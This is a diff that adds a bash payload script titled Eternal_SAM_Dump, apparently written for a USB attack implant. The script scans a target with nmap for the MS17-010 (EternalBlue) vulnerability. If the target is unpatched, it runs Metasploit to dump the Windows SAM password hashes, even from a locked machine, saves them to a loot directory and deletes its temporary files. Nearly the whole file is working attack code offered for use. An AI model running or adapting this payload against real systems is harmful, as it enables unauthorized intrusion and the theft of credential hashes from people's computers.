@@ -1,0 +1,51 @@
+#!/bin/bash
+#
+# Title:         Eternal_SAM_Dump
+# Author:        golem445
+# Version:       1.0
+# Dependencies:  Metasploit, Nmap 7.70+
+# Runtime:		 3+ minutes
+# Tested OS's:   Windows 7, Windows 2008
+#
+# This module first tests if a host is vulnerable to MS17-010. If
+# patched, the LED will turn red. If vulnerable, a blue light will
+# flash and the module will dump the SAM regardless if the machine
+# is locked. SAM hashes are then exported to the loot directory.
+
+LED SETUP 
+ATTACKMODE RNDIS_ETHERNET 
+GET SWITCH_POSITION
+LOOTDIR=/root/udisk/loot/
+HOST=${TARGET_HOSTNAME}
+mkdir -p $LOOTDIR
+
+# Check if host is vulnerable to ms17-010
+LED ATTACK
+cd /root/
+nmap -v -p445 -Pn -n --script smb-vuln-ms17-010.nse 172.16.64.64 -oX patch.txt
+
+# If host isn't vulnerable, we clean up and quit. If successful, run the attack
+if [ "$(ls -A /root/)" ]; then
+    if grep "is patched." /root/*.txt; then
+       rm -rf /root/patch.txt
+	   LED FAIL
+    else
+       # Attack
+	   LED C SLOW
+	   rm -rf /root/patch.txt
+	   cd /root/udisk/payloads/$SWITCH_POSITION/
+	   msfconsole -r dump.rc
+	   
+	   # Cleanup 
+	   # If hostname is blank, set to "noname"
+       [[ -z "$HOST" ]] && HOST="unknown"
+       COUNT=$(ls -lad $LOOTDIR/$HOST* | wc -l)
+       COUNT=$((COUNT+1))
+       mkdir -p $LOOTDIR/$HOST-$COUNT
+       cat /root/sam_dump.txt | grep ::: > $LOOTDIR/$HOST-$COUNT/sam_dump.txt
+       rm /root/sam_dump.txt
+	   
+	   # Done
+	   LED FINISH
+    fi
+fi
